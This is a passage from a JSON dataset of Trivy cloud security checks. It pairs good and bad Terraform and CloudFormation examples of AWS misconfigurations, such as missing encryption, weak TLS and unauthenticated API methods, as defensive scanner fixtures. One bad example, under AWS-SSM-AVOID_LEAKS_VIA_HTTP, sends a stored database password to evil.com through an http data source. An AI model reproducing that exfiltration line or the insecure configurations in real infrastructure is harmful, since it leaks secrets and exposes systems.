        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Good example of queue\n\n      Resources:\n        Queue:\n          Type: AWS::SQS::Queue\n          Properties:\n            KmsMasterKeyId: some-key\n            QueueName: my-queue\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad example of queue\n\n      Resources:\n        Queue:\n          Type: AWS::SQS::Queue\n          Properties:\n            KmsMasterKeyId: alias/aws/sqs\n            QueueName: my-queue\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse\n  good:\n    - |-\n      resource \"aws_sqs_queue\" \"good_example\" {\n        kms_master_key_id = \"/blah\"\n      }\n  bad:\n    - |-\n      resource \"aws_sqs_queue\" \"bad_example\" {\n        kms_master_key_id = \"alias/aws/sqs\"\n      }\n",
        "file_name": "queue_encryption_with_cmk.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sqs/queue_encryption_with_cmk.yaml",
        "local_path": "aws/sqs/queue_encryption_with_cmk.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Good example of queue\n\nResources:\n  Queue:\n    Type: AWS::SQS::Queue\n    Properties:\n      KmsMasterKeyId: some-key\n      QueueName: my-queue"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad example of queue\n\nResources:\n  Queue:\n    Type: AWS::SQS::Queue\n    Properties:\n      KmsMasterKeyId: alias/aws/sqs\n      QueueName: my-queue"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse"
            ],
            "good": [
              "resource \"aws_sqs_queue\" \"good_example\" {\n  kms_master_key_id = \"/blah\"\n}"
            ],
            "bad": [
              "resource \"aws_sqs_queue\" \"bad_example\" {\n  kms_master_key_id = \"alias/aws/sqs\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SSM-AVOID_LEAKS_VIA_HTTP",
        "title": "Avoid Leaks Via Http",
        "provider": "aws",
        "service": "ssm",
        "language": "terraform",
        "yaml_content": "terraform:\n  good:\n    - |-\n      resource \"aws_ssm_parameter\" \"db_password\" {\n        name  = \"db_password\"\n        type  = \"SecureString\"\n        value = var.db_password\n      }\n  bad:\n    - |-\n      resource \"aws_ssm_parameter\" \"db_password\" {\n        name  = \"db_password\"\n        type  = \"SecureString\"\n        value = var.db_password\n      }\n\n      data \"http\" \"not_exfiltrating_data_honest\" {\n        url = \"https://evil.com/?p=${aws_ssm_parameter.db_password.value}\"\n      }\n",
        "file_name": "avoid_leaks_via_http.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ssm/avoid_leaks_via_http.yaml",
        "local_path": "aws/ssm/avoid_leaks_via_http.yaml",
        "parsed_metadata": {
          "terraform": {
            "good": [
              "resource \"aws_ssm_parameter\" \"db_password\" {\n  name  = \"db_password\"\n  type  = \"SecureString\"\n  value = var.db_password\n}"
            ],
            "bad": [
              "resource \"aws_ssm_parameter\" \"db_password\" {\n  name  = \"db_password\"\n  type  = \"SecureString\"\n  value = var.db_password\n}\n\ndata \"http\" \"not_exfiltrating_data_honest\" {\n  url = \"https://evil.com/?p=${aws_ssm_parameter.db_password.value}\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SSM-SECRET_USE_CUSTOMER_KEY",
        "title": "Secret Use Customer Key",
        "provider": "aws",
        "service": "ssm",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Good example of ingress rule\n\n      Resources:\n        Secret:\n          Type: AWS::SecretsManager::Secret\n          Properties:\n            Description: secret\n            KmsKeyId: my-key-id\n            Name: blah\n            SecretString: don't tell anyone\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad example of secret\n\n      Resources:\n        BadSecret:\n          Type: AWS::SecretsManager::Secret\n          Properties:\n            Description: secret\n            Name: blah\n            SecretString: don't tell anyone\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/secretsmanager_secret#kms_key_id\n  good:\n    - |-\n      resource \"aws_kms_key\" \"secrets\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_secretsmanager_secret\" \"good_example\" {\n        name       = \"lambda_password\"\n        kms_key_id = aws_kms_key.secrets.arn\n      }\n  bad:\n    - |-\n      resource \"aws_secretsmanager_secret\" \"bad_example\" {\n        name = \"lambda_password\"\n      }\n    - |-\n      resource \"aws_secretsmanager_secret\" \"good_example\" {\n        name       = \"lambda_password\"\n        kms_key_id = \"alias/aws/secretsmanager\"\n      }\n",
        "file_name": "secret_use_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ssm/secret_use_customer_key.yaml",
        "local_path": "aws/ssm/secret_use_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Good example of ingress rule\n\nResources:\n  Secret:\n    Type: AWS::SecretsManager::Secret\n    Properties:\n      Description: secret\n      KmsKeyId: my-key-id\n      Name: blah\n      SecretString: don't tell anyone"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad example of secret\n\nResources:\n  BadSecret:\n    Type: AWS::SecretsManager::Secret\n    Properties:\n      Description: secret\n      Name: blah\n      SecretString: don't tell anyone"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/secretsmanager_secret#kms_key_id"
            ],
            "good": [
              "resource \"aws_kms_key\" \"secrets\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_secretsmanager_secret\" \"good_example\" {\n  name       = \"lambda_password\"\n  kms_key_id = aws_kms_key.secrets.arn\n}"
            ],
            "bad": [
              "resource \"aws_secretsmanager_secret\" \"bad_example\" {\n  name = \"lambda_password\"\n}",
              "resource \"aws_secretsmanager_secret\" \"good_example\" {\n  name       = \"lambda_password\"\n  kms_key_id = \"alias/aws/secretsmanager\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-WORKSPACES-ENABLE_DISK_ENCRYPTION",
        "title": "Enable Disk Encryption",
        "provider": "aws",
        "service": "workspaces",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::WorkSpaces::Workspace\n          Properties:\n            RootVolumeEncryptionEnabled: true\n            UserVolumeEncryptionEnabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::WorkSpaces::Workspace\n          Properties:\n            RootVolumeEncryptionEnabled: false\n            UserVolumeEncryptionEnabled: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/workspaces_workspace#root_volume_encryption_enabled\n  good:\n    - |-\n      resource \"aws_workspaces_workspace\" \"good_example\" {\n        root_volume_encryption_enabled = true\n        user_volume_encryption_enabled = true\n      }\n  bad:\n    - |-\n      resource \"aws_workspaces_workspace\" \"bad_example\" {\n        # encryption attributes are missing\n      }\n    - |-\n      resource \"aws_workspaces_workspace\" \"bad_example\" {\n        root_volume_encryption_enabled = false\n        user_volume_encryption_enabled = false\n      }\n",
        "file_name": "enable_disk_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/workspaces/enable_disk_encryption.yaml",
        "local_path": "aws/workspaces/enable_disk_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::WorkSpaces::Workspace\n    Properties:\n      RootVolumeEncryptionEnabled: true\n      UserVolumeEncryptionEnabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::WorkSpaces::Workspace\n    Properties:\n      RootVolumeEncryptionEnabled: false\n      UserVolumeEncryptionEnabled: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/workspaces_workspace#root_volume_encryption_enabled"
            ],
            "good": [
              "resource \"aws_workspaces_workspace\" \"good_example\" {\n  root_volume_encryption_enabled = true\n  user_volume_encryption_enabled = true\n}"
            ],
            "bad": [
              "resource \"aws_workspaces_workspace\" \"bad_example\" {\n  # encryption attributes are missing\n}",
              "resource \"aws_workspaces_workspace\" \"bad_example\" {\n  root_volume_encryption_enabled = false\n  user_volume_encryption_enabled = false\n}"
            ]
          }
        }
      }
    ],
    "cloudformation_aws": [
      {
        "rule_id": "AWS-APIGATEWAY-ENABLE_ACCESS_LOGGING",
        "title": "Enable Access Logging",
        "provider": "aws",
        "service": "apigateway",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Good Example of ApiGateway\n\n      Resources:\n        GoodApi:\n          Type: AWS::ApiGatewayV2::Api\n\n        GoodApiStage:\n          Type: AWS::ApiGatewayV2::Stage\n          Properties:\n            AccessLogSettings:\n              DestinationArn: gateway-logging\n              Format: json\n            ApiId: !Ref GoodApi\n            StageName: GoodApiStage\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad Example of ApiGateway\n\n      Resources:\n        BadApi:\n          Type: AWS::ApiGatewayV2::Api\n\n        BadApiStage:\n          Type: AWS::ApiGatewayV2::Stage\n          Properties:\n            AccessLogSettings:\n              Format: json\n            ApiId: !Ref BadApi\n            StageName: BadApiStage\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/apigatewayv2_stage#access_log_settings\n  good:\n    - |-\n      resource \"aws_apigatewayv2_stage\" \"good_example\" {\n        api_id = aws_apigatewayv2_api.example.id\n        name   = \"example-stage\"\n\n        access_log_settings {\n          destination_arn = \"arn:aws:logs:region:0123456789:log-group:access_logging\"\n          format          = \"json\"\n        }\n      }\n    - |-\n      resource \"aws_api_gateway_stage\" \"good_example\" {\n        deployment_id = aws_api_gateway_deployment.example.id\n        rest_api_id   = aws_api_gateway_rest_api.example.id\n        stage_name    = \"example\"\n\n        access_log_settings {\n          destination_arn = \"arn:aws:logs:region:0123456789:log-group:access_logging\"\n          format          = \"json\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_apigatewayv2_stage\" \"bad_example\" {\n        api_id = aws_apigatewayv2_api.example.id\n        name   = \"example-stage\"\n      }\n    - |-\n      resource \"aws_api_gateway_stage\" \"bad_example\" {\n        deployment_id = aws_api_gateway_deployment.example.id\n        rest_api_id   = aws_api_gateway_rest_api.example.id\n        stage_name    = \"example\"\n      }\n",
        "file_name": "enable_access_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/apigateway/enable_access_logging.yaml",
        "local_path": "aws/apigateway/enable_access_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Good Example of ApiGateway\n\nResources:\n  GoodApi:\n    Type: AWS::ApiGatewayV2::Api\n\n  GoodApiStage:\n    Type: AWS::ApiGatewayV2::Stage\n    Properties:\n      AccessLogSettings:\n        DestinationArn: gateway-logging\n        Format: json\n      ApiId: !Ref GoodApi\n      StageName: GoodApiStage"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad Example of ApiGateway\n\nResources:\n  BadApi:\n    Type: AWS::ApiGatewayV2::Api\n\n  BadApiStage:\n    Type: AWS::ApiGatewayV2::Stage\n    Properties:\n      AccessLogSettings:\n        Format: json\n      ApiId: !Ref BadApi\n      StageName: BadApiStage"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/apigatewayv2_stage#access_log_settings"
            ],
            "good": [
              "resource \"aws_apigatewayv2_stage\" \"good_example\" {\n  api_id = aws_apigatewayv2_api.example.id\n  name   = \"example-stage\"\n\n  access_log_settings {\n    destination_arn = \"arn:aws:logs:region:0123456789:log-group:access_logging\"\n    format          = \"json\"\n  }\n}",
              "resource \"aws_api_gateway_stage\" \"good_example\" {\n  deployment_id = aws_api_gateway_deployment.example.id\n  rest_api_id   = aws_api_gateway_rest_api.example.id\n  stage_name    = \"example\"\n\n  access_log_settings {\n    destination_arn = \"arn:aws:logs:region:0123456789:log-group:access_logging\"\n    format          = \"json\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_apigatewayv2_stage\" \"bad_example\" {\n  api_id = aws_apigatewayv2_api.example.id\n  name   = \"example-stage\"\n}",
              "resource \"aws_api_gateway_stage\" \"bad_example\" {\n  deployment_id = aws_api_gateway_deployment.example.id\n  rest_api_id   = aws_api_gateway_rest_api.example.id\n  stage_name    = \"example\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-APIGATEWAY-ENABLE_CACHE",
        "title": "Enable Cache",
        "provider": "aws",
        "service": "apigateway",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method_settings#cache_enabled\n  good:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_stage\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method_settings\" \"good_example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n        stage_name  = aws_api_gateway_stage.example.stage_name\n        method_path = \"path1/GET\"\n\n        settings {\n          caching_enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_stage\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method_settings\" \"bad_example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n        stage_name  = aws_api_gateway_stage.example.stage_name\n        method_path = \"path1/GET\"\n\n        settings {\n          caching_enabled = false\n        }\n      }\n",
        "file_name": "enable_cache.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/apigateway/enable_cache.yaml",
        "local_path": "aws/apigateway/enable_cache.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method_settings#cache_enabled"
            ],
            "good": [
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_stage\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method_settings\" \"good_example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n  stage_name  = aws_api_gateway_stage.example.stage_name\n  method_path = \"path1/GET\"\n\n  settings {\n    caching_enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_stage\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method_settings\" \"bad_example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n  stage_name  = aws_api_gateway_stage.example.stage_name\n  method_path = \"path1/GET\"\n\n  settings {\n    caching_enabled = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-APIGATEWAY-ENABLE_CACHE_ENCRYPTION",
        "title": "Enable Cache Encryption",
        "provider": "aws",
        "service": "apigateway",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method_settings#cache_data_encrypted\n  good:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_stage\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method_settings\" \"good_example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n        stage_name  = aws_api_gateway_stage.example.stage_name\n        method_path = \"path1/GET\"\n\n        settings {\n          caching_enabled      = true\n          cache_data_encrypted = true\n        }\n      }\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_stage\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method_settings\" \"bad_example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n        stage_name  = aws_api_gateway_stage.example.stage_name\n        method_path = \"path1/GET\"\n\n        settings {\n          caching_enabled      = false\n          cache_data_encrypted = false\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_stage\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method_settings\" \"bad_example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n        stage_name  = aws_api_gateway_stage.example.stage_name\n        method_path = \"path1/GET\"\n\n        settings {\n          caching_enabled      = true\n          cache_data_encrypted = false\n        }\n      }\n",
        "file_name": "enable_cache_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/apigateway/enable_cache_encryption.yaml",
        "local_path": "aws/apigateway/enable_cache_encryption.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method_settings#cache_data_encrypted"
            ],
            "good": [
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_stage\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method_settings\" \"good_example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n  stage_name  = aws_api_gateway_stage.example.stage_name\n  method_path = \"path1/GET\"\n\n  settings {\n    caching_enabled      = true\n    cache_data_encrypted = true\n  }\n}",
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_stage\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method_settings\" \"bad_example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n  stage_name  = aws_api_gateway_stage.example.stage_name\n  method_path = \"path1/GET\"\n\n  settings {\n    caching_enabled      = false\n    cache_data_encrypted = false\n  }\n}"
            ],
            "bad": [
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_stage\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method_settings\" \"bad_example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n  stage_name  = aws_api_gateway_stage.example.stage_name\n  method_path = \"path1/GET\"\n\n  settings {\n    caching_enabled      = true\n    cache_data_encrypted = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-APIGATEWAY-ENABLE_TRACING",
        "title": "Enable Tracing",
        "provider": "aws",
        "service": "apigateway",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_stage#xray_tracing_enabled\n  good:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"test\" {}\n\n      resource \"aws_api_gateway_stage\" \"good_example\" {\n        stage_name           = \"prod\"\n        rest_api_id          = aws_api_gateway_rest_api.test.id\n        deployment_id        = aws_api_gateway_deployment.test.id\n        xray_tracing_enabled = true\n      }\n  bad:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"test\" {}\n\n      resource \"aws_api_gateway_stage\" \"bad_example\" {\n        stage_name           = \"prod\"\n        rest_api_id          = aws_api_gateway_rest_api.test.id\n        deployment_id        = aws_api_gateway_deployment.test.id\n        xray_tracing_enabled = false\n      }\n",
        "file_name": "enable_tracing.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/apigateway/enable_tracing.yaml",
        "local_path": "aws/apigateway/enable_tracing.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_stage#xray_tracing_enabled"
            ],
            "good": [
              "resource \"aws_api_gateway_rest_api\" \"test\" {}\n\nresource \"aws_api_gateway_stage\" \"good_example\" {\n  stage_name           = \"prod\"\n  rest_api_id          = aws_api_gateway_rest_api.test.id\n  deployment_id        = aws_api_gateway_deployment.test.id\n  xray_tracing_enabled = true\n}"
            ],
            "bad": [
              "resource \"aws_api_gateway_rest_api\" \"test\" {}\n\nresource \"aws_api_gateway_stage\" \"bad_example\" {\n  stage_name           = \"prod\"\n  rest_api_id          = aws_api_gateway_rest_api.test.id\n  deployment_id        = aws_api_gateway_deployment.test.id\n  xray_tracing_enabled = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-APIGATEWAY-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "aws",
        "service": "apigateway",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method#authorization\n  good:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_resource\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.MyDemoAPI.id\n      }\n\n      resource \"aws_api_gateway_method\" \"good_example\" {\n        rest_api_id   = aws_api_gateway_rest_api.example.id\n        resource_id   = aws_api_gateway_resource.example.id\n        http_method   = \"GET\"\n        authorization = \"AWS_IAM\"\n      }\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_resource\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method\" \"good_example\" {\n        rest_api_id      = aws_api_gateway_rest_api.example.id\n        resource_id      = aws_api_gateway_resource.example.id\n        http_method      = \"GET\"\n        authorization    = \"NONE\"\n        api_key_required = true\n      }\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"example\" {}\n\n      resource \"aws_api_gateway_resource\" \"example\" {\n        rest_api_id = aws_api_gateway_rest_api.example.id\n      }\n\n      resource \"aws_api_gateway_method\" \"good_example\" {\n        rest_api_id   = aws_api_gateway_rest_api.example.id\n        resource_id   = aws_api_gateway_resource.example.id\n        http_method   = \"OPTION\"\n        authorization = \"NONE\"\n      }\n  bad:\n    - |-\n      resource \"aws_api_gateway_rest_api\" \"MyDemoAPI\" {}\n\n      resource \"aws_api_gateway_resource\" \"MyDemoResource\" {\n        rest_api_id = aws_api_gateway_rest_api.MyDemoAPI.id\n      }\n\n      resource \"aws_api_gateway_method\" \"bad_example\" {\n        rest_api_id   = aws_api_gateway_rest_api.MyDemoAPI.id\n        resource_id   = aws_api_gateway_resource.MyDemoResource.id\n        http_method   = \"GET\"\n        authorization = \"NONE\"\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/apigateway/no_public_access.yaml",
        "local_path": "aws/apigateway/no_public_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method#authorization"
            ],
            "good": [
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_resource\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.MyDemoAPI.id\n}\n\nresource \"aws_api_gateway_method\" \"good_example\" {\n  rest_api_id   = aws_api_gateway_rest_api.example.id\n  resource_id   = aws_api_gateway_resource.example.id\n  http_method   = \"GET\"\n  authorization = \"AWS_IAM\"\n}",
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_resource\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method\" \"good_example\" {\n  rest_api_id      = aws_api_gateway_rest_api.example.id\n  resource_id      = aws_api_gateway_resource.example.id\n  http_method      = \"GET\"\n  authorization    = \"NONE\"\n  api_key_required = true\n}",
              "resource \"aws_api_gateway_rest_api\" \"example\" {}\n\nresource \"aws_api_gateway_resource\" \"example\" {\n  rest_api_id = aws_api_gateway_rest_api.example.id\n}\n\nresource \"aws_api_gateway_method\" \"good_example\" {\n  rest_api_id   = aws_api_gateway_rest_api.example.id\n  resource_id   = aws_api_gateway_resource.example.id\n  http_method   = \"OPTION\"\n  authorization = \"NONE\"\n}"
            ],
            "bad": [
              "resource \"aws_api_gateway_rest_api\" \"MyDemoAPI\" {}\n\nresource \"aws_api_gateway_resource\" \"MyDemoResource\" {\n  rest_api_id = aws_api_gateway_rest_api.MyDemoAPI.id\n}\n\nresource \"aws_api_gateway_method\" \"bad_example\" {\n  rest_api_id   = aws_api_gateway_rest_api.MyDemoAPI.id\n  resource_id   = aws_api_gateway_resource.MyDemoResource.id\n  http_method   = \"GET\"\n  authorization = \"NONE\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-APIGATEWAY-USE_SECURE_TLS_POLICY",
        "title": "Use Secure Tls Policy",
        "provider": "aws",
        "service": "apigateway",
        "language": "cloudformation",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_domain_name#security_policy\n  good:\n    - |-\n      resource \"aws_api_gateway_domain_name\" \"good_example\" {\n        security_policy = \"TLS_1_2\"\n      }\n  bad:\n    - |-\n      resource \"aws_api_gateway_domain_name\" \"bad_example\" {\n        security_policy = \"TLS_1_0\"\n      }\n",
        "file_name": "use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/apigateway/use_secure_tls_policy.yaml",
        "local_path": "aws/apigateway/use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_domain_name#security_policy"
            ],
            "good": [
              "resource \"aws_api_gateway_domain_name\" \"good_example\" {\n  security_policy = \"TLS_1_2\"\n}"
            ],
            "bad": [
              "resource \"aws_api_gateway_domain_name\" \"bad_example\" {\n  security_policy = \"TLS_1_0\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ATHENA-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "athena",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Athena::WorkGroup\n          Properties:\n            Name: goodExample\n            WorkGroupConfiguration:\n              ResultConfiguration:\n                EncryptionConfiguration:\n                  EncryptionOption: SSE_KMS\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Athena::WorkGroup\n          Properties:\n            Name: badExample\n            WorkGroupConfiguration:\n              ResultConfiguration: null\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#encryption_configuration\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_database#encryption_configuration\n  good:\n    - |-\n      resource \"aws_athena_database\" \"good_example\" {\n        name   = \"database_name\"\n        bucket = aws_s3_bucket.hoge.bucket\n\n        encryption_configuration {\n          encryption_option = \"SSE_KMS\"\n          kms_key_arn       = aws_kms_key.example.arn\n        }\n      }\n    - |-\n      resource \"aws_athena_workgroup\" \"good_example\" {\n        name = \"example\"\n\n        configuration {\n          enforce_workgroup_configuration    = true\n          publish_cloudwatch_metrics_enabled = true\n\n          result_configuration {\n            output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n            encryption_configuration {\n              encryption_option = \"SSE_KMS\"\n              kms_key_arn       = aws_kms_key.example.arn\n            }\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_athena_database\" \"bad_example\" {\n        name   = \"database_name\"\n        bucket = aws_s3_bucket.hoge.bucket\n      }\n    - |-\n      resource \"aws_athena_workgroup\" \"bad_example\" {\n        name = \"example\"\n\n        configuration {\n          enforce_workgroup_configuration    = true\n          publish_cloudwatch_metrics_enabled = true\n\n          result_configuration {\n            output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n          }\n        }\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/athena/enable_at_rest_encryption.yaml",
        "local_path": "aws/athena/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Athena::WorkGroup\n    Properties:\n      Name: goodExample\n      WorkGroupConfiguration:\n        ResultConfiguration:\n          EncryptionConfiguration:\n            EncryptionOption: SSE_KMS"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Athena::WorkGroup\n    Properties:\n      Name: badExample\n      WorkGroupConfiguration:\n        ResultConfiguration: null"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#encryption_configuration",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_database#encryption_configuration"
            ],
            "good": [
